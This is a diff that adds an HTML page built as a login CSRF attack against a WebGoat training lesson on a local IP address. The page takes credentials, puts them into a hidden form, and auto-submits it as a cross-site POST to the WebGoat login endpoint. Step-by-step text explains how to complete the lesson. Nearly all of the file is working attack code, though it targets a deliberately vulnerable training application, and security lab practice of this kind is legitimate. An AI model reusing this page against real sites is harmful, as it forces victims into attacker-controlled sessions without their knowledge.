@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login CSRF - Simple Auto Attack</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 700px;
+            margin: 50px auto;
+            padding: 30px;
+            background: #f44336;
+            color: white;
+        }
+        .box {
+            background: white;
+            color: #333;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+        }
+        h1 { color: #d32f2f; margin-top: 0; }
+        input {
+            padding: 12px;
+            font-size: 16px;
+            margin: 10px 0;
+            width: 90%;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+        }
+        button {
+            background: #d32f2f;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        button:hover { background: #b71c1c; }
+        .alert {
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+            background: #fff3cd;
+            border-left: 4px solid #ff9800;
+        }
+        code {
+            background: #f5f5f5;
+            padding: 2px 6px;
+            border-radius: 3px;
+            color: #d32f2f;
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>🔓 Login CSRF - Quick Attack</h1>
+        
+        <div class="alert">
+            <strong>⚠️ Before starting:</strong>
+            <ol>
+                <li>Create user <code>csrf-[yourname]</code> in WebGoat</li>
+                <li>Keep the lesson tab open</li>
+                <li>Fill in the form below</li>
+            </ol>
+        </div>
+
+        <h3>Enter CSRF User Credentials:</h3>
+        <form id="setup">
+            <label><strong>CSRF Username:</strong> (e.g., csrf-tom)</label><br>
+            <input type="text" id="csrfUser" placeholder="csrf-yourname" required /><br>
+            
+            <label><strong>CSRF Password:</strong></label><br>
+            <input type="password" id="csrfPass" placeholder="Password you set" required /><br>
+            
+            <button type="button" onclick="attack()">🚀 Execute Login CSRF</button>
+        </form>
+
+        <div id="status" style="margin-top: 20px;"></div>
+    </div>
+
+    <!-- Hidden login form -->
+    <form id="loginForm" method="POST" 
+          action="http://192.168.254.112:8001/WebGoat/login"
+          target="_blank"
+          style="display:none;">
+        <input type="text" name="username" id="formUser" />
+        <input type="password" name="password" id="formPass" />
+    </form>
+
+    <script>
+        function attack() {
+            const username = document.getElementById('csrfUser').value.trim();
+            const password = document.getElementById('csrfPass').value;
+            
+            if (!username || !password) {
+                alert('Please fill in both fields!');
+                return;
+            }
+
+            if (!username.startsWith('csrf-')) {
+                if (!confirm('Username should start with "csrf-". Continue anyway?')) {
+                    return;
+                }
+            }
+
+            // Fill hidden form
+            document.getElementById('formUser').value = username;
+            document.getElementById('formPass').value = password;
+
+            // Show status
+            document.getElementById('status').innerHTML = `
+                <div style="background: #e8f5e9; padding: 15px; border-radius: 5px; color: #1b5e20;">
+                    <h3>✅ Attack Executed!</h3>
+                    <p><strong>Steps:</strong></p>
+                    <ol>
+                        <li>A new window should open</li>
+                        <li>You'll be logged in as <code>${username}</code></li>
+                        <li>Go to that window and verify the login</li>
+                        <li>Go back to your ORIGINAL lesson tab</li>
+                        <li>Click the "Press the button" button</li>
+                        <li>Lesson should complete! 🎉</li>
+                    </ol>
+                </div>
+            `;
+
+            // Submit form
+            console.log('Executing Login CSRF...');
+            console.log('Username:', username);
+            setTimeout(() => {
+                HTMLFormElement.prototype.submit.call(document.getElementById('loginForm'));
+            }, 500);
+        }
+
+        console.log('Login CSRF Attack Ready');
+        console.log('Target: http://192.168.254.112:8001/WebGoat/login');
+    </script>
+</body>
+</html>
